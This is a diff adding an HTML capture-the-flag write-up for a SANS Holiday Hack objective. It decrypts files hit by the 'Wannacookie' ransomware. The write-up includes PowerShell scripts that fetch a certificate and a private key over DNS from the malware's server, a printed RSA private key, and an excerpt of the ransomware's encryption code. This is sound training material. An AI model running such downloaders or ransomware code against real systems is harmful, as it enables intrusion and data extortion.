@@ -1,0 +1,672 @@
+<!DOCTYPE html><head><link rel="stylesheet" href="style.css" type="text/css" media="all"/><style type="text/css">.code-black-background{color:#e0e0e0;background-color:#1f1f1f;}</style></head><body><div class="entry-title entry-title-no-feat-img">
+<h1>Objective 9.4: Recover Alabaster&apos;s Password</h1>
+</div><div class="entry-content">
+<p>TO DO: ADD GIF</p>
+<p>Difficulty: 5/5
+  <br>
+  <br>Alabaster Snowball is in dire need of your help. Santa&apos;s file server
+  has been hit with malware. Help Alabaster Snowball deal with the malware
+  on Santa&apos;s server by completing several tasks.
+  <br>For hints on achieving this objective, please visit Shinny Upatree and
+  help him with the&#xA0;Sleigh Bell Lottery&#xA0;Cranberry Pi terminal challenge.
+  <br>
+  <br>Objective 9.4:
+  <br>Alabaster - &quot;Now that we don&apos;t have to worry about new infections,
+  I could sure use your L337 security skills for one last thing. As I mentioned,
+  I made the mistake of analyzing the malware on my host computer and the
+  ransomware encrypted my password database. Take this zip (https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip)
+  with a memory dump and my encrypted password database, and see if you can <strong>recover my passwords</strong>.
+  One of the passwords will unlock our access to the vault so we can get
+  in before the hackers.&quot;
+</p>
+<p>Note: Shinny Upatree can be found on Floor 1, on the South Eastern side
+  of the lobby area
+  <br>
+  <br>Hints given:
+  <br>Shinny Upatree:
+  <br>&quot;<em>Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie? Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted. Many elves were affected, so Alabaster went to go see if he could help out. I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer. An elf I follow online said he analyzed Wannacookie and that it communicates over DNS. He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way. Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie! Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt. Perhaps there is a flaw in the wannacookie author&apos;s DNS server that we can manipulate to retrieve what we need. If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files.</em>&quot;
+  <br>
+  <br>Alabaster Snowball:
+  <br><em>&quot;Pulling strings from a memory dump using the linux strings command requires you specify the -e option with the specific format required by the OS and processor. Of course, you could also use&#xA0;</em>
+  <a href="https://github.com/chrisjd20/power_dump"><em>powerdump</em></a><em>.&quot;</em>
+</p>
+<p>
+  <br>The malware script &apos;wannacookie.ps1&apos; can be downloaded as described
+  in the previous Objective 9-3.
+  <br><em>Note: The password for the zip file below is &apos;infected&apos;</em>
+  <br>
+</p>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/wannacookie.zip">wannacookie.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/wannacookie.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/alabaster_passwords.elfdb_.wannacookie.zip">alabaster_passwords.elfdb.wannacookie.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/alabaster_passwords.elfdb_.wannacookie.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<hr class="wp-block-separator">
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The &apos;wannacookie.ps1&apos; script contains a few ASCII HEX strings.</p>
+<pre class="wp-block-code code-black-background"><code>&apos;6B6579666F72626F746964&apos; = &apos;keyforbotid&apos;
+&apos;6B696C6C737769746368&apos; = &apos;killswitch&apos;
+&apos;7365727665722E637274&apos; = &apos;server.crt&apos;
+&apos;72616e736f6d697370616964&apos; = &apos;ransomispaid&apos;</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The portion of code below downloads the file &apos;server.crt&apos; over DNS</p>
+<pre class="wp-block-code code-black-background"><code>$pub_key = [System.Convert]::FromBase64String($(get_over_dns(&quot;7365727665722E637274&quot;) ) )</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Here is a standalone script that downloads the server.crt file - it works
+  on both Linux (using PowerShell Core 6 or later) and Windows 10 or later.</p>
+<pre class="wp-block-code code-black-background"><code>&lt;# This script works on Linux PowerShell Core 6+ and Windows 10+ #&gt;
+if ($IsLinux){function Resolve-DnsName {param([string]$Server, [string]$Name, [string]$Type); $result = dig +noedns +short -t &quot;$Type&quot; &quot;$Name&quot; &quot;@$Server&quot;; New-Object PsObject -Property @{strings=$result.Replace(&quot;`&quot;&quot;,&quot;&quot;)}}}
+
+function H2A() {
+  Param($a)
+  $outa
+  $a -split &apos;(..)&apos; | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_}
+  return $outa
+}
+
+function get_over_dns($f) {
+  $h = &apos;&apos;
+  foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).Strings, 10)-1)) {
+    $h += $(Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).Strings
+  }
+  return (H2A $h)
+}
+get_over_dns(&quot;7365727665722E637274&quot;) | Out-File server.crt</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p><em>Note: The password for the zip file below is &apos;infected&apos;</em></p>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/download-server-crt.zip">download-server-crt.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/download-server-crt.zip"class="wp-block-file__button" download="">Download</a>
+</div>
+<p>Using the &apos;openssl&apos; tool, verify that the server.crt file is
+  a valid certificate file
+  <br>
+</p>
+<pre class="wp-block-code code-black-background"><code>root@kali:~/SANS# openssl x509 -in server.crt -text -noout
+unable to load certificate
+139965633814976:error:0909006C:PEM routines:get_name:no start line:../crypto/pem/pem_lib.c:745:Expecting: TRUSTED CERTIFICATE
+root@kali:~/SANS# cat server.crt
+MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
+BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
+aWRnaXRzIFB0eSBMdGQwHhcNMTgwODAzMTUwMTA3WhcNMTkwODAzMTUwMTA3WjBF
+MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
+ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
+CgKCAQEAxIjc2VVG1wmzBi+LDNlLYpUeLHhGZYtgjKAye96h6pfrUqcLSvcuC+s5
+ywy1kgOrrx/pZh4YXqfbolt77x2AqvjGuRJYwa78EMtHtgq/6njQa3TLULPSpMTC
+QM9H0SWF77VgDRSReQPjaoyPo3TFbS/Pj1ThlqdTwPA0lu4vvXi5Kj2zQ8QnxYQB
+hpRxFPnB9Ak6G9EgeR5NEkz1CiiVXN37A/P7etMiU4QsOBipEcBvL6nEAoABlUHi
+zWCTBBb9PlhwLdlsY1k7tx5wHzD7IhJ5P8tdksBzgrWjYxUfBreddg+4nRVVuKeb
+E9Jq6zImCfu8elXjCJK8OLZP9WZWDQIDAQABo1AwTjAdBgNVHQ4EFgQUfeOgZ4f+
+kxU1/BN/PpHRuzBYzdEwHwYDVR0jBBgwFoAUfeOgZ4f+kxU1/BN/PpHRuzBYzdEw
+DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAhdhDHQvW9Q+Fromk7n2G
+2eXkTNX1bxz2PS2Q1ZW393Z83aBRWRvQKt/qGCAi9AHg+NB/F0WMZfuuLgziJQTH
+QS+vvCn3bi1HCwz9w7PFe5CZegaivbaRD0h7V9RHwVfzCGSddUEGBH3j8q7thrKO
+xOmEwvHi/0ar+0sscBideOGq11hoTn74I+gHjRherRvQWJb4Abfdr4kUnAsdxsl7
+MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiV
+oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF
++w==
+root@kali:~/SANS#</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The file &apos;server.crt&apos; is missing the certificate delimiters
+  &apos;-----BEGIN CERTIFICATE-----&apos; and &apos;-----END CERTIFICATE-----&apos;.
+  Add them and read the server.crt file again with openssl to verify that
+  the file is a valid certificate.</p>
+<pre class="wp-block-code code-black-background"><code>root@kali:~/SANS# echo &apos;-----BEGIN CERTIFICATE-----&apos; | cat - server.crt &gt; x &amp;&amp; mv x server.crt
+root@kali:~/SANS# echo &apos;-----END CERTIFICATE-----&apos; &gt;&gt; server.crt
+root@kali:~/SANS# cat server.crt
+-----BEGIN CERTIFICATE-----
+MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
+BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
+aWRnaXRzIFB0eSBMdGQwHhcNMTgwODAzMTUwMTA3WhcNMTkwODAzMTUwMTA3WjBF
+MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
+ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
+CgKCAQEAxIjc2VVG1wmzBi+LDNlLYpUeLHhGZYtgjKAye96h6pfrUqcLSvcuC+s5
+ywy1kgOrrx/pZh4YXqfbolt77x2AqvjGuRJYwa78EMtHtgq/6njQa3TLULPSpMTC
+QM9H0SWF77VgDRSReQPjaoyPo3TFbS/Pj1ThlqdTwPA0lu4vvXi5Kj2zQ8QnxYQB
+hpRxFPnB9Ak6G9EgeR5NEkz1CiiVXN37A/P7etMiU4QsOBipEcBvL6nEAoABlUHi
+zWCTBBb9PlhwLdlsY1k7tx5wHzD7IhJ5P8tdksBzgrWjYxUfBreddg+4nRVVuKeb
+E9Jq6zImCfu8elXjCJK8OLZP9WZWDQIDAQABo1AwTjAdBgNVHQ4EFgQUfeOgZ4f+
+kxU1/BN/PpHRuzBYzdEwHwYDVR0jBBgwFoAUfeOgZ4f+kxU1/BN/PpHRuzBYzdEw
+DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAhdhDHQvW9Q+Fromk7n2G
+2eXkTNX1bxz2PS2Q1ZW393Z83aBRWRvQKt/qGCAi9AHg+NB/F0WMZfuuLgziJQTH
+QS+vvCn3bi1HCwz9w7PFe5CZegaivbaRD0h7V9RHwVfzCGSddUEGBH3j8q7thrKO
+xOmEwvHi/0ar+0sscBideOGq11hoTn74I+gHjRherRvQWJb4Abfdr4kUnAsdxsl7
+MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiV
+oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF
++w==
+-----END CERTIFICATE-----
+root@kali:~/SANS# openssl x509 -in server.crt -text -noout
+Certificate:
+  Data:
+    Version: 3 (0x2)
+    Serial Number:
+      fe:9e:d7:d7:30:da:c0:a3
+    Signature Algorithm: sha256WithRSAEncryption
+    Issuer: C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
+    Validity
+      Not Before: Aug  3 15:01:07 2018 GMT
+      Not After : Aug  3 15:01:07 2019 GMT
+    Subject: C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
+    Subject Public Key Info:
+      Public Key Algorithm: rsaEncryption
+        RSA Public-Key: (2048 bit)
+        Modulus:
+          00:c4:88:dc:d9:55:46:d7:09:b3:06:2f:8b:0c:d9:
+          4b:62:95:1e:2c:78:46:65:8b:60:8c:a0:32:7b:de:
+          a1:ea:97:eb:52:a7:0b:4a:f7:2e:0b:eb:39:cb:0c:
+          b5:92:03:ab:af:1f:e9:66:1e:18:5e:a7:db:a2:5b:
+          7b:ef:1d:80:aa:f8:c6:b9:12:58:c1:ae:fc:10:cb:
+          47:b6:0a:bf:ea:78:d0:6b:74:cb:50:b3:d2:a4:c4:
+          c2:40:cf:47:d1:25:85:ef:b5:60:0d:14:91:79:03:
+          e3:6a:8c:8f:a3:74:c5:6d:2f:cf:8f:54:e1:96:a7:
+          53:c0:f0:34:96:ee:2f:bd:78:b9:2a:3d:b3:43:c4:
+          27:c5:84:01:86:94:71:14:f9:c1:f4:09:3a:1b:d1:
+          20:79:1e:4d:12:4c:f5:0a:28:95:5c:dd:fb:03:f3:
+          fb:7a:d3:22:53:84:2c:38:18:a9:11:c0:6f:2f:a9:
+          c4:02:80:01:95:41:e2:cd:60:93:04:16:fd:3e:58:
+          70:2d:d9:6c:63:59:3b:b7:1e:70:1f:30:fb:22:12:
+          79:3f:cb:5d:92:c0:73:82:b5:a3:63:15:1f:06:b7:
+          9d:76:0f:b8:9d:15:55:b8:a7:9b:13:d2:6a:eb:32:
+          26:09:fb:bc:7a:55:e3:08:92:bc:38:b6:4f:f5:66:
+          56:0d
+        Exponent: 65537 (0x10001)
+    X509v3 extensions:
+      X509v3 Subject Key Identifier:
+        7D:E3:A0:67:87:FE:93:15:35:FC:13:7F:3E:91:D1:BB:30:58:CD:D1
+      X509v3 Authority Key Identifier:
+        keyid:7D:E3:A0:67:87:FE:93:15:35:FC:13:7F:3E:91:D1:BB:30:58:CD:D1
+
+      X509v3 Basic Constraints:
+        CA:TRUE
+  Signature Algorithm: sha256WithRSAEncryption
+     85:d8:43:1d:0b:d6:f5:0f:85:ae:89:a4:ee:7d:86:d9:e5:e4:
+     4c:d5:f5:6f:1c:f6:3d:2d:90:d5:95:b7:f7:76:7c:dd:a0:51:
+     59:1b:d0:2a:df:ea:18:20:22:f4:01:e0:f8:d0:7f:17:45:8c:
+     65:fb:ae:2e:0c:e2:25:04:c7:41:2f:af:bc:29:f7:6e:2d:47:
+     0b:0c:fd:c3:b3:c5:7b:90:99:7a:06:a2:bd:b6:91:0f:48:7b:
+     57:d4:47:c1:57:f3:08:64:9d:75:41:06:04:7d:e3:f2:ae:ed:
+     86:b2:8e:c4:e9:84:c2:f1:e2:ff:46:ab:fb:4b:2c:70:18:9d:
+     78:e1:aa:d7:58:68:4e:7e:f8:23:e8:07:8d:18:5e:ad:1b:d0:
+     58:96:f8:01:b7:dd:af:89:14:9c:0b:1d:c6:c9:7b:31:3c:4c:
+     d1:fe:2d:e1:c7:56:1f:27:89:50:7d:f2:06:e4:fa:7a:e2:1d:
+     f6:b9:fb:19:03:62:eb:51:e3:0a:15:e3:11:fc:da:f2:1a:41:
+     0b:83:ae:ac:22:9c:7d:08:95:a1:8f:f4:07:15:dd:c6:04:f2:
+     83:08:40:75:69:af:36:b1:cf:a1:0c:81:e5:0f:57:c2:03:7f:
+     c1:63:2d:ae:53:d9:7f:2d:c0:5b:db:86:16:3f:ec:80:9b:f8:
+     db:17:05:fb</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/server.crt_.zip">server.crt.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/server.crt_.zip"class="wp-block-file__button" download="">Download</a>
+</div>
+<p>&quot;7365727665722E637274&quot; is ASCII code that decodes to &quot;server.crt&quot;
+  (server public key). It&apos;s possible to download the file &quot;server.key&quot;
+  (server private key) using the downloader script, replacing &apos;7365727665722E637274&apos;
+  (&apos;server.crt&apos;) with &apos;7365727665722E6B6579&apos; (&apos;server.key&apos;)
+  <br>
+</p>
+<p>Below is a standalone script that downloads the server.key file - the
+  script works on both Linux (using PowerShell Core 6 or later) and Windows
+  10 or later.
+  <br>
+</p>
+<pre class="wp-block-code code-black-background"><code>&lt;# This script works on Linux PowerShell Core 6+ and Windows 10+ #&gt;
+if ($IsLinux){function Resolve-DnsName {param([string]$Server, [string]$Name, [string]$Type); $result = dig +noedns +short -t &quot;$Type&quot; &quot;$Name&quot; &quot;@$Server&quot;; New-Object PsObject -Property @{strings=$result.Replace(&quot;`&quot;&quot;,&quot;&quot;)}}}
+
+function H2A() {
+  Param($a)
+  $outa
+  $a -split &apos;(..)&apos; | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_}
+  return $outa
+}
+
+function get_over_dns($f) {
+  $h = &apos;&apos;
+  foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).Strings, 10)-1)) {
+    $h += $(Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).Strings
+  }
+  return (H2A $h)
+}
+get_over_dns(&quot;7365727665722E6B6579&quot;) | Out-File server.key</code></pre>
+<div
+style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p><em>Note: The password for the zip file below is &apos;infected&apos;</em>
+</p>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/download-server-key.zip">download-server-key.ps1</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/download-server-key.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<p>Read the server.key file with openssl to verify that the file is a valid certificate.</p>
+<pre class="wp-block-code code-black-background"><code>root@kali:/SANS# openssl rsa -text -in server.key
+RSA Private-Key: (2048 bit, 2 primes)
+modulus:
+  00:c4:88:dc:d9:55:46:d7:09:b3:06:2f:8b:0c:d9:
+  4b:62:95:1e:2c:78:46:65:8b:60:8c:a0:32:7b:de:
+  a1:ea:97:eb:52:a7:0b:4a:f7:2e:0b:eb:39:cb:0c:
+  b5:92:03:ab:af:1f:e9:66:1e:18:5e:a7:db:a2:5b:
+  7b:ef:1d:80:aa:f8:c6:b9:12:58:c1:ae:fc:10:cb:
+  47:b6:0a:bf:ea:78:d0:6b:74:cb:50:b3:d2:a4:c4:
+  c2:40:cf:47:d1:25:85:ef:b5:60:0d:14:91:79:03:
+  e3:6a:8c:8f:a3:74:c5:6d:2f:cf:8f:54:e1:96:a7:
+  53:c0:f0:34:96:ee:2f:bd:78:b9:2a:3d:b3:43:c4:
+  27:c5:84:01:86:94:71:14:f9:c1:f4:09:3a:1b:d1:
+  20:79:1e:4d:12:4c:f5:0a:28:95:5c:dd:fb:03:f3:
+  fb:7a:d3:22:53:84:2c:38:18:a9:11:c0:6f:2f:a9:
+  c4:02:80:01:95:41:e2:cd:60:93:04:16:fd:3e:58:
+  70:2d:d9:6c:63:59:3b:b7:1e:70:1f:30:fb:22:12:
+  79:3f:cb:5d:92:c0:73:82:b5:a3:63:15:1f:06:b7:
+  9d:76:0f:b8:9d:15:55:b8:a7:9b:13:d2:6a:eb:32:
+  26:09:fb:bc:7a:55:e3:08:92:bc:38:b6:4f:f5:66:
+  56:0d
+publicExponent: 65537 (0x10001)
+privateExponent:
+  1d:d2:06:70:93:97:e4:18:fc:a8:fb:9d:c5:9d:52:
+  ea:ea:65:61:a9:fe:44:7a:19:74:3c:fa:6c:01:23:
+  e0:4c:9c:d0:35:b8:68:ef:88:75:16:83:f6:63:3f:
+  49:a0:74:f4:65:8b:2c:8b:74:77:28:51:13:19:7e:
+  7c:91:a5:6c:4b:c3:1b:61:c5:45:de:1f:31:0d:27:
+  1c:60:15:2e:a6:96:39:37:c7:81:bf:47:3e:e8:fb:
+  f0:89:83:04:21:05:69:91:c3:b9:38:5d:ba:56:f4:
+  b2:be:11:2d:64:12:70:b6:c8:6f:9f:19:7b:9a:78:
+  02:d6:6f:a4:57:0f:b7:57:cd:e9:8a:92:ff:2d:22:
+  e5:51:05:44:e5:ae:95:d3:1b:10:93:75:c7:ec:5e:
+  88:9a:7c:b8:8b:39:2a:82:fd:28:7d:67:8d:97:04:
+  81:95:50:a4:b5:f3:ae:c8:ca:af:ae:d4:de:76:0c:
+  28:37:a6:1a:31:da:9d:85:64:17:5a:73:bf:fa:da:
+  ad:d5:27:4b:c8:7a:ab:a2:46:cb:35:7d:d4:fa:4b:
+  13:62:34:2d:8f:ad:1a:8a:4a:9a:e4:d4:cd:53:a6:
+  55:fe:ec:97:92:cc:c0:4b:2c:d6:0d:f1:f2:03:a1:
+  db:5e:4e:a6:cf:58:f7:38:52:7c:98:73:06:4b:58:
+  01
+prime1:
+  00:e5:fb:0f:8a:7d:26:f7:a9:94:44:56:fb:3d:b8:
+  69:9a:21:c8:fa:37:37:73:af:ee:c4:04:e5:99:ba:
+  68:f2:e5:65:8f:ad:27:b4:4b:a2:dd:e2:54:dc:15:
+  d6:97:a2:55:04:1e:41:34:13:48:fb:1f:c3:3e:74:
+  a1:b6:12:6c:f7:cd:a2:4d:88:02:17:f3:d5:1c:bd:
+  e9:6b:5d:35:74:d2:4f:a4:31:82:2d:bc:75:9c:85:
+  d8:87:eb:81:0e:8e:c5:ab:73:c7:28:f5:63:60:2b:
+  55:e5:2d:0b:46:e2:20:69:12:b5:5c:b5:b3:9c:8c:
+  99:73:bf:5c:d7:81:48:b2:4d
+prime2:
+  00:da:c5:1a:10:a2:5c:e0:8c:49:43:1b:f4:f7:56:
+  c0:bc:d6:33:ba:8d:d6:ad:46:95:c1:d1:44:4c:f3:
+  fe:0c:07:fb:d1:00:bf:0b:07:cd:f8:64:a8:67:48:
+  dc:b3:82:1f:4d:e4:6f:7f:4c:00:7d:a8:92:7e:e1:
+  16:25:51:43:95:22:12:be:f2:df:3a:df:8f:7c:fc:
+  fe:2c:28:d9:4f:42:2a:38:2d:dd:e5:7e:74:fd:db:
+  1a:59:53:58:58:7f:24:4f:43:6f:6b:72:29:b6:73:
+  5e:f7:28:33:0f:70:ee:a0:5d:37:b3:0c:26:b5:87:
+  ae:10:f2:2b:24:0b:88:92:c1
+exponent1:
+  00:af:c2:ad:df:e3:41:f2:a8:d1:3d:61:54:65:99:
+  18:6b:c9:42:35:a8:19:62:fa:a3:f9:7e:dc:92:1e:
+  1a:b2:f7:8a:24:c1:ea:c4:29:c1:f0:dd:56:89:54:
+  cf:49:d7:b0:2d:93:89:b5:68:bf:af:dc:58:74:d4:
+  e1:f9:aa:1f:49:4b:08:ad:44:32:85:67:be:09:57:
+  42:9a:e1:03:47:a2:ab:67:0a:c7:38:78:fd:51:80:
+  21:39:cf:4c:34:79:fc:ab:c9:b1:fd:a5:7c:2b:35:
+  33:52:10:98:bb:b5:79:9b:93:c6:b3:71:d2:30:e4:
+  6b:2a:40:a7:8d:b3:aa:81:49
+exponent2:
+  7d:6f:b0:2f:43:79:2f:83:20:6a:ab:37:fd:2d:af:
+  db:56:92:58:70:05:5c:5a:f1:79:2d:0d:15:76:7c:
+  fe:d7:01:0a:e8:7b:a1:ce:7a:c9:e6:a5:2c:7b:79:
+  98:2f:8e:d5:71:9a:80:89:ca:6a:42:62:a4:ff:58:
+  5c:53:49:05:d4:80:9d:1d:d2:e3:05:d6:57:1b:14:
+  7d:ab:7a:56:58:a0:ae:8f:96:00:85:4e:7d:53:c8:
+  ba:d8:ef:f9:e6:04:a2:b2:0e:cb:b3:ac:b9:21:53:
+  9d:31:5e:7d:87:0a:3b:c6:d7:2e:01:54:9c:97:4c:
+  36:09:34:b5:39:2b:b8:c1
+coefficient:
+  00:c3:31:22:8e:fe:f6:8b:4d:f2:15:b1:9e:a7:b8:
+  21:ed:11:02:a3:96:90:1b:d9:3d:0e:e6:10:37:91:
+  0b:98:51:85:f0:a3:9f:dc:3a:1b:ed:be:ff:b7:46:
+  94:a8:8e:4c:2d:d0:9f:7c:33:f1:0a:06:e2:fe:71:
+  02:a5:c4:24:a0:67:f7:bd:8a:bc:ed:1e:43:99:e2:
+  61:e8:46:e3:20:5a:22:61:c7:fa:1e:8d:54:19:45:
+  77:41:89:e5:58:73:68:12:72:a0:e9:3e:2a:73:a7:
+  bd:56:1b:ac:60:6a:51:da:f3:5e:f4:b0:c8:5b:ae:
+  22:a0:65:90:79:d6:48:87:82
+writing RSA key
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAxIjc2VVG1wmzBi+LDNlLYpUeLHhGZYtgjKAye96h6pfrUqcL
+SvcuC+s5ywy1kgOrrx/pZh4YXqfbolt77x2AqvjGuRJYwa78EMtHtgq/6njQa3TL
+ULPSpMTCQM9H0SWF77VgDRSReQPjaoyPo3TFbS/Pj1ThlqdTwPA0lu4vvXi5Kj2z
+Q8QnxYQBhpRxFPnB9Ak6G9EgeR5NEkz1CiiVXN37A/P7etMiU4QsOBipEcBvL6nE
+AoABlUHizWCTBBb9PlhwLdlsY1k7tx5wHzD7IhJ5P8tdksBzgrWjYxUfBreddg+4
+nRVVuKebE9Jq6zImCfu8elXjCJK8OLZP9WZWDQIDAQABAoIBAB3SBnCTl+QY/Kj7
+ncWdUurqZWGp/kR6GXQ8+mwBI+BMnNA1uGjviHUWg/ZjP0mgdPRliyyLdHcoURMZ
+fnyRpWxLwxthxUXeHzENJxxgFS6mljk3x4G/Rz7o+/CJgwQhBWmRw7k4XbpW9LK+
+ES1kEnC2yG+fGXuaeALWb6RXD7dXzemKkv8tIuVRBUTlrpXTGxCTdcfsXoiafLiL
+OSqC/Sh9Z42XBIGVUKS1867Iyq+u1N52DCg3phox2p2FZBdac7/62q3VJ0vIequi
+Rss1fdT6SxNiNC2PrRqKSprk1M1TplX+7JeSzMBLLNYN8fIDodteTqbPWPc4UnyY
+cwZLWAECgYEA5fsPin0m96mURFb7PbhpmiHI+jc3c6/uxATlmbpo8uVlj60ntEui
+3eJU3BXWl6JVBB5BNBNI+x/DPnShthJs982iTYgCF/PVHL3pa101dNJPpDGCLbx1
+nIXYh+uBDo7Fq3PHKPVjYCtV5S0LRuIgaRK1XLWznIyZc79c14FIsk0CgYEA2sUa
+EKJc4IxJQxv091bAvNYzuo3WrUaVwdFETPP+DAf70QC/CwfN+GSoZ0jcs4IfTeRv
+f0wAfaiSfuEWJVFDlSISvvLfOt+PfPz+LCjZT0IqOC3d5X50/dsaWVNYWH8kT0Nv
+a3IptnNe9ygzD3DuoF03swwmtYeuEPIrJAuIksECgYEAr8Kt3+NB8qjRPWFUZZkY
+a8lCNagZYvqj+X7ckh4asveKJMHqxCnB8N1WiVTPSdewLZOJtWi/r9xYdNTh+aof
+SUsIrUQyhWe+CVdCmuEDR6KrZwrHOHj9UYAhOc9MNHn8q8mx/aV8KzUzUhCYu7V5
+m5PGs3HSMORrKkCnjbOqgUkCgYB9b7AvQ3kvgyBqqzf9La/bVpJYcAVcWvF5LQ0V
+dnz+1wEK6HuhznrJ5qUse3mYL47VcZqAicpqQmKk/1hcU0kF1ICdHdLjBdZXGxR9
+q3pWWKCuj5YAhU59U8i62O/55gSisg7Ls6y5IVOdMV59hwo7xtcuAVScl0w2CTS1
+OSu4wQKBgQDDMSKO/vaLTfIVsZ6nuCHtEQKjlpAb2T0O5hA3kQuYUYXwo5/cOhvt
+vv+3RpSojkwt0J98M/EKBuL+cQKlxCSgZ/e9irztHkOZ4mHoRuMgWiJhx/oejVQZ
+RXdBieVYc2gScqDpPipzp71WG6xgalHa8170sMhbriKgZZB51kiHgg==
+-----END RSA PRIVATE KEY-----</code></pre>
+<div style="height:20px" aria-hidden="true"
+class="wp-block-spacer"></div>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/server.key.zip">server.key.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/server.key.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<p>The code below (taken from &apos;wannacookie.ps1&apos;) downloads the
+  public key &apos;server.crt&apos;, creates a random 16-byte/128 bits key
+  &apos;$Byte_key&apos; and encrypts the key using the downloaded public
+  key &apos;server.crt&apos; and stores the public key encrypted key into
+  variable &apos;$Pub_key_encrypted_Key&apos;.
+  <br>
+  <br>Then, the 16-byte key is deleted from memory - so we will not find those
+  values in any memory dump.
+  <br>
+  <br>Since the length of the public key is 2048 bits (as per openssl command
+  output above), and the data encrypted is only 128 bits, the length of the
+  encrypted key will be 2048 bits or 256 bytes.
+  <br>
+  <br>However, since the function &apos;Pub_Key_Enc&apos; turns the encrypted
+  bytes into their HEX value representation using the B2H function (e.g.
+  the single character &apos;A&apos; is represented by function B2H as two
+  characters &apos;41&apos;), the encrypted 256 bytes are stored as their
+  HEX byte values in variable &apos;$Pub_key_encrypted_Key&apos;, which will
+  have a size of 512 bytes in memory.
+  <br>
+  <br>It is important to remember not to look for the encrypted bytes in memory,
+  but rather to look for their ASCII HEX representation.
+  <br>
+</p>
+<pre class="wp-block-code code-black-background"><code>function Pub_Key_Enc($key_bytes, [byte[]]$pub_bytes){
+   $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
+   $cert.Import($pub_bytes)
+   $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true)
+   return $(B2H $encKey)
+}
+
+$pub_key = [System.Convert]::FromBase64String($(get_over_dns(&quot;7365727665722E637274&quot;)))
+$Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join &apos;&apos;))  | ? {$_ -ne 0x00})
+$Hex_key = $(B2H $Byte_key)
+$Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
+Clear-variable -Name &quot;Hex_key&quot;
